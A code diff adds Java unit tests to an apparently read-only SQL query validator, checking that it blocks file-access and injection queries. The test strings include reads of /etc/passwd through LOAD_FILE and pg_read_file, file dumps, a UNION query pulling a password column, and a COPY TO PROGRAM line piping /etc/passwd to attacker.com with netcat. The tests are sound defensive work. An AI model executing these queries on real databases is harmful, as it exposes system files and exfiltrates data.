@@ -78,6 +78,18 @@ class QueryValidatorTest {
         );
     }
 
+    @Test
+    void shouldAllowSubquery() {
+
+        String sql = """
+                SELECT full_name FROM customers
+                WHERE id IN (SELECT customer_id FROM orders WHERE id > 10)
+                """;
+
+        assertDoesNotThrow(() ->
+                queryValidator.validate(sql, schema)
+        );
+    }
 
     // =========================================================
     // CASE VARIATION
@@ -356,6 +368,226 @@ class QueryValidatorTest {
         );
     }
 
+    // =========================================================
+    // FILE ACCESS PROTECTION (INTO OUTFILE / DUMPFILE / LOAD_FILE)
+    // =========================================================
+
+    @Test
+    void shouldRejectSelectIntoOutfile() {
+
+        String sql =
+                "SELECT * FROM customers INTO OUTFILE '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectSelectIntoOutfileRegardlessOfCase() {
+
+        String sql =
+                "select * from customers into outfile '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectSelectIntoDumpfile() {
+
+        String sql =
+                "SELECT * FROM customers INTO DUMPFILE '/tmp/dump.bin'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectLoadFileFunction() {
+
+        String sql =
+                "SELECT LOAD_FILE('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    // =========================================================
+    // FILE ACCESS PROTECTION - POSTGRESQL
+    // =========================================================
+
+    @Test
+    void shouldRejectPgReadFileFunction() {
+
+        String sql =
+                "SELECT pg_read_file('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgReadFileFunctionRegardlessOfCase() {
+
+        String sql =
+                "select PG_READ_FILE('/etc/passwd') from customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgReadBinaryFileFunction() {
+
+        String sql =
+                "SELECT pg_read_binary_file('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgLsDirFunction() {
+
+        String sql =
+                "SELECT pg_ls_dir('/tmp') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectLoExportFunction() {
+
+        String sql =
+                "SELECT lo_export(o.id, '/tmp/dump.bin') FROM orders o";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectLoImportFunction() {
+
+        String sql =
+                "SELECT lo_import('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyToFile() {
+
+        String sql =
+                "COPY customers TO '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyFromSubqueryToProgram() {
+
+        String sql =
+                "COPY (SELECT * FROM customers) TO PROGRAM 'nc attacker.com 4444 < /etc/passwd'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyRegardlessOfCase() {
+
+        String sql =
+                "copy customers to '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldNotFalsePositiveOnColumnNamedCopy() {
+
+        // "copy" chỉ nguy hiểm khi là LỆNH Ở ĐẦU statement (COPY table TO
+        // ...). Một câu SELECT hợp lệ có cột tên là "copy" (ví dụ số bản
+        // sao/lượt copy) không được phép bị chặn nhầm.
+        String sql =
+                "SELECT copy FROM customers";
+
+        assertDoesNotThrow(() ->
+                queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    // =========================================================
+    // OTHER DDL / SESSION STATEMENTS
+    // =========================================================
+
+    @Test
+    void shouldRejectCreateTable() {
+
+        String sql =
+                "CREATE TABLE hacked (id INT)";
+
+        assertThrows(
+                ReadOnlyViolationException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectUnionBasedInjectionAgainstUnknownTable() {
+
+        String sql =
+                "SELECT full_name FROM customers UNION SELECT password FROM users";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
 
     // =========================================================
     // SCHEMA SECURITY
